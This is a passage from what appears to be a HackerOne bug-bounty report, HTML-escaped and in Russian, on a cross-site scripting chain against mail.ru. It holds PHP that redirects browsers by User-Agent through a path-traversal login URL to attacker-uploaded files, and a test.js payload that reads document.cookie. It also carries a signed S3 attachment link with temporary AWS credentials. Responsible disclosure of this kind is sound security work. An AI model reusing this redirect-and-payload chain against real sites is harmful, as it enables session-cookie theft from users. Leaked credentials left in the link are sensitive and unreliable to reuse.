class=\"c1\"\u003e//var_dump($client_ua);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$redirect_url\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;https://account.mail.ru/login?v=0.3.13/../../../get/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$ua_routes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e//FF Linux\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;xgLens3gSCg20hivTRagWNJRagV09F1hUtAC3K9CioIhdEw7VhTMdkGKwqR9chXUcSWxg0hVDsrc1XBxfAMPWsZ7Mtigx6UIAKNvO1wguGm9lswX92YxmurFLxsehkKgsbKUWhd6Ds0gMFnvrx4bgpghRlTRag/test.js??\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e//Win NT 6.1\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ourROgRyY0ku4SBxmNtiAftNtiueG2xIF0E4niIFY8QIhIbSNsOVm37svkC3JIphAJEIaiT0sGnh6tRSGm4R0SdBEljIzlaJs1qhqp5Gqf7XO1rnnHZGOMD5WSuuwJgikJd8dGSM67pSOzv2ks0kPTQScKmNti/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;om2NJuByvqNogCHXvaUt3GvaUt8jzMdXpH9uotxgNnECLY1b2iY42SrCo5cJpmzPshamovxhUXZqzTztSdzOGCiG1kgCwriFECVb3g2tKaoeUiDpXzLmezd2mCMd7OhXQj0qDXddq6iChpGYRtkicPECWXvaUt/test.js??\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;wFzJqfD5AQJjR1iyVvMGOQ4vMGqrIUxiC1gHvSqrfHAGWB6a0GMrG2HGPEJyC1Cypecsy2RraIqVyJy1RMCogGVAlL61qhB7mSrlrrys701JPsfU91gSA4ckgi563H71Rvl5EG4zFFX1GQjhHSIwZF2IW2VvMG/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ZbDbdu16AYF2010DXyISt0XyIS8SL2IIu0tr5SJ7UdaGi36yIGVG9KsIzpfxfSgpKTQIxpPCK1nqHVrSDiKB6sX7udJGtvrvCGzHFiGiMXQy01KUVdqGAeVAI1zQ04miHe9zmGQGCYT1ejo80I9jr8tGwjXyIS/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;vpRuf62pV0FyCGmoE7Xi77a7XiCmcARSNSutsG4eO2nIxKm7fIOrW84InQz1tSLKAuWSdBHP6s876juGylvbbGbAl5f1GNYak1Mjgt7SM1p5aSMANl6SU1XSsIt8DaMIdOFiqIyxIRHSd7XIWSaTodKGoaE7Xi/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;mKXu3WpU65pDSClK0xEX6LQxEXBgQwImV93momlfXCwikA6ZWmTyuy6CTuLopXBuoDaiWqJ8cXEiIMNifkxqAC5v26vmQs6cBC8RFHJCsFfxXtTIGw0ihPyLImUAkW7XENNugtsCcbgmJLrvJmzCSreiIh0xEX/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;jUhPoHrrhcc2lXqPoiJCIzoiJCvMWqQCwDCu2X25qzimWNoj0tg3BU5XWQYMDtL3TX3CLlUdaiCPvxltOGtyXtLmqGRta445TC4syJaCa8oENmjNRwdtB1ugEiRLlBOtBafDytPomFNtjbSIUig1vxoi27oiJC/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Pz4beFySYDyPP1RYUXbSHDcXbSWgeaNG853xb1IRUGpSV9Lj31ZGjtjGnqV3KG8gGvxIsFfOkGlEfjSIuAqBWSvebheGriFXGiyTHJgGdrBJpIeI6JvS0czWoS6lW3P1JQjOxIcawsaG1Wv8KigoWd5GCDUXbS/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e//\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;a4rrNIMBcXes0sJCPoQgHRToQg53mk5gR3hkLhII1c4gMIQWjxxttkHKTylx3sOn98yKI2nGgK9e2DZxurDPgxGZFcchE5vNtxCIgeosiTjRfsMlSFah9af5HKsbmfvg6CBrnx45lCVsZuPDvKShMVaxtnPoQg/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;SM7AU6KcSv4OoIbTfXlIoJ9XlIIFzvmS4zlFUGxBtfdGyqJDbIvImUjS9oCLJsCyajIGvj0gAGCecXtIV617TIrhBpa1UmvUVG9O8or1vevoIiU4xnZSco5Ss1eSsxsI4ARuPICyDYjILLqGnSUIo1iifJfXlI/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;klBBESp2lWvq4KkR8e2gBs0e2gRSxqRsuzYzFKTXCeBx2izlqx1DmuxxlWqmssq1FT6hqc55IKREonIgs6EZHg1CriJKT8ApLx0X1bUgZaSVaKixf9RKG0aA8giwofJxoeC0XhVhtWBgDtqQtsh42PJKr38e2g/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;dpDeMJHxyWyFOKxLulIsvxPlIsilnLIg0fpjyxnHR2nhwa7uih9dRLZg3gmgXgFvNpcx2TJqyKTRn8ehTWKmAhADBKsKD99cssN1dCSsJY0KMhlGNX0hRRKkpsMLGCIsAg7ZFhpLa3RgflEFahAqIWAsaBulIs/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;RbDCzTqxyZWfIKxLJ8us8B58usUJ4v9xsdGiAxQv6DbgjO3kAh1YCWPKEO8n2xGGogsxVPKvJhWUz91x81qLExT2mT6hDLPEgKcYz8KhKwWsGhl06zIh5Gs3rs5vPzZxLdBPoKE0Heag7An8AsYQOsLKv2J8us/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/55.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;kEOixDxyes0DHxLBBlAKx3LlAKNrNcrKeyJDdxJN7Xrg6snWsKqiMI3KgJz6Bxau1LjsnbaaHxO2pQjgfuNhjx4MrVXsowA7whUhLIwKGMWkjxnz6YIKns97Wh12BnMxbgVaphPxiMdsZ6t97KVpaGzgQkBlAK/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:56.0) Gecko/20100101 Firefox/56.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;OlNqOVzneOQjNXur6pDCWiUpDCnE4uYX7qIOPioH923ChlQzwiXkfmpmhKTOrmTesUwCf9i8yXLREVRmciRc0iKsQBktwmTfgmTXkJWmCtUXqmYOwlsXC09GjCC0AoLX0zupzir3ns0tZP7VNC8xDLsXW86pDC/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;mHkTlJNUd65apnQxf1PWM7Y1PWnRAFyWxpPSwZFcg3GRN9EMDWBdAhaZZQrEQnSaBuCRqEBBARNHzNyZHKQKGA1Guo0n9ZMYGWWW6a2ZmgQdRRm7va9nVkmEsABj2FaZoXv3rZoOHLqAAVX1JWlJcD9Wqy91PW/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e//Win NT.10\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;YuXAP8AuGn7HFgyjjItsHsbItsgrGpSg9q42KxpdeNXKShwfoxhgUyCgMlEeHghTqrhx15zvixqb2j9K8lalnsknzbWsdIXqpxE3lsQs1zVRzxS0uTzx0hjZSxxhZa0KOloWss4UQsMhO6d7HhlFPPBKcDjIts/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;YxXfyOWmUU2w2nvkZHQWIenHQWyzdtbn1rqp0AIn13aZ0gKJWWNVWI6AKqG6RZzccBanM2IMEn3EgRcZuIBV6AB7X5dAuzHveZMhj1YZrWxQtRZh78jZhn5L1niXX8uAAklusn7Av4gAM1aQIZu73OwZZHZHQW/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;bYBZTCrdm8jZ9mlxvzjiyLlzjiALh3hX2QSGxmLcoJ3XrqhhTC7Kd4NXd6aMDCW78HzC77kCFtr5KCVXRRnRMtbkcPCtaiV8XXi6MnHC53VPEik7clECewpF3C2XHXWtvXT3EtPK90RtzN4FUi8YbAfm3ybzji/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;QOBjrepKtgoa5gg0kH6rokH6xyIuiugzk7T6Kokm1vsp3hCJh3Mvs5hO41oTg6PtjDgKEeTNhFzbO8Kf4fLmgzJ4c3Ktulb3s8hZR6KMrYCoxvs9mxx4VgA2gOjFZihVO8kNxCdyMgK90tRKhvVKl9sE4kH6x/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;crUcnsXPdDZgbIGEwrlSzqPrlSXmTtCGM6OTTsft9AD1KUKNCGqlScKGGvjTUsPliaJ18qQx6sPTJA21I3qEbIrulcUGiFNbBsILbB0G3aRhnGOjSze1QZFsU1OnUqSIuua8oGXMh4RIrYbkDSG34V1inawrlS/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;wCdB7I5zX5NNCtpyW5bXXZZ5bXVCSqltWhOS3XQ4iFItagpystwjZmFCJs40JCmGXJitGT02YXoMJF9tlYxz9Crk5RaCq9ZHECvcauHiaUymNC4fINLi9LiASXJWFGZXua6IstlkEwNtt39pTt70YVUmd2W5bX/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;oTBkcbOHuUcYsWqqDsdWCPYsdW5PhHPAYOV3QZz5k1jZJjnwLAezYKpR8NEiAnYaegunHlqqbnUWgVUnZVt4NWKDFVQWfPwwUn5Dc9kZ6YaiQnSbR8rZSI6kgnkFg35nSMDzFWOAjZ7nb9zyYRFAwy3AlEDsdW/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;fy9ixvQKJIH4lKg9BZGhb7kZGhrSpIBhljfuPx0zOJoKQZZZDhFHBZ3sRY3hkxGvrBdxR8lsvsSP7JNhwWDL3g5fnSSsJjwtdhyrtArxwuUOmKpFN0WgUPsywgmhUIqh2k1qeh5BU1dgexFXnxTnr0HxERBZGh/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;aaSPTTusNXXrUgXx088gFF888guu4vBhi4RD8sz3ojNgDG4zQhf2bNpglMlBChpaXbuKb6issggYXSBKWfNo8KTXFckhpTqLtgnjQT4stW5fwKR3IC6g0ruobhSQwEhg19z8es3NN2uxp1VUhxrtmoBhryQ88g/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s1\"\u003e\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Oya1mq9p9w2HatCXHuqmqw6uqm7MrGmXyUAngtAHciQX6St13mapMvRtOY8glidLOJbCN4Aw4CEVvy3m3ZEKwiDTE39tnwoZbiy9UzLXQVDLliJPoq8tciHsVXw9nYNt8ndmyX96lUJmlao4gtgk7ymCUXHuqm/test.js?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e//\u003c/span\u003e\n\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"k\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ua_routes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client_ua\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$destination\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$redirect_url\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ua_routes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client_ua\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Location: \u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$destination\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Content-Type: text/plain\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Unknown user-agent:\u0026lt;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$client_ua\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eЯ заранее понаотправлял файлы через агент своему контакту с вышеприведенными юзерагентами. Содержимое загруженного файла было одинаково во всех случаях:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emihailob@kali:~/tmp cat test.js \nalert(\u0026#39;Hello i am attacker script from uploaded file via agent. The script was executed on a domain:\u0026#39; + document.domain + \u0026#39;. The cookie are: \u0026#39; + document.cookie );\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"screen_003.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/638/7e4ed82227e3a28cbf64a8819d8b103862f8e8c5/screen_003.png?response-content-disposition=attachment%3B%20filename%3D%22screen_003.png%22%3B%20filename%2A%3DUTF-8%27%27screen_003.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052523Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=6069b8b295698c373b707baa1fe5f49a3d27fd61429af1ec62613ebf8b906b91\" data-attachment-type=\"image/png\"\u003e\u003cimg 